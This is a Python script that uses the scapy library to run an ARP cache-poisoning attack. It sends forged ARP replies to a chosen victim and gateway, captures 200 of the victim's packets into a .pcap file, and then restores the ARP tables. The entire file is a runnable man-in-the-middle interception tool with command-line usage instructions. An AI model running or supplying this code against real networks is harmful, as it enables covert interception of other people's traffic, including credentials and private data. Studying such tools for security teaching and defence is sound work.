from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, send, sniff, srp, wrpcap)
import sys
import time
from typing import Optional


"""
Description:

Performs ARP poison attack against a 'gateway' and 'victim' IP addresses.
Captures packets between victim, localhost, and gateway and writes to .pcap file
"""


# Helper function to get the MAC address of a particular IP
def get_mac(targetip: str) -> Optional[str]:

    # Creates ARP discover packet to ask for the MAC address for 'targetip' passed value
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
    ans, _ = srp(packet, timeout=2, retry=10, verbose=False)
    
    # Returns MAC address for 'targetip' from ARP response packet
    for _, a in ans:
        return a[Ether].src
    return None


class Arper:

    # Initializes class variables and calls get_mac() function for given IP
    def __init__(self, victim: str, gateway: str, interface: str ='eth0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb: int = 0

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)

    # Starts threads to run the poison() and sniff() functions at the same time
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    # Creates poisoned packets and sends to victim and gateway
    def poison(self):
        # Creates ARP packet for victim pc
        poison_victim = ARP()
        poison_victim.op: int = 2
        poison_victim.psrc: str = self.gateway
        poison_victim.pdst: str = self.victim
        poison_victim.hwdst: str = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'mac dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)

        # Create ARP packet gateway
        poison_gateway = ARP()
        poison_gateway.op: int = 2
        poison_gateway.psrc: str = self.victim
        poison_gateway.pdst: str = self.gateway
        poison_gateway.hwdst: str = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'mac dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')

        # Sends packet to victim and gateway 
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    # Sniff network to observe the arpspoof process
    def sniff(self, count=200):

        # Sleeps 5 secs. to allow poisoned packets to be sent
        time.sleep(5)
        print(f'Sniffing {count} packets')

        # Creates a BPF syntax filter to sniff for packets
        bpf_filter: str = "ip host %s" % victim

        # Sniff for 'count' number of packets on specified interface
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        
        # Used to write a .pcap file for later analysis
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished')

    # Restore network to prior state
    def restore(self):
        print('Restoring ARP tables...')

        # Sends 5 restoration packets to victim pc
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        
        # Sends 5 restoration packets to gateway
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)

if __name__ == '__main__':
    try:
        (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    except IndexError:
        sys.stderr.write("Error: Not enough information from user.\n")
        sys.stderr.write("Format: sudo python arper.py <victim_ip> <gateway_ip> <interface='eth0'>")
        sys.exit(1)

    myarp = Arper(victim, gateway, interface)
    myarp.run()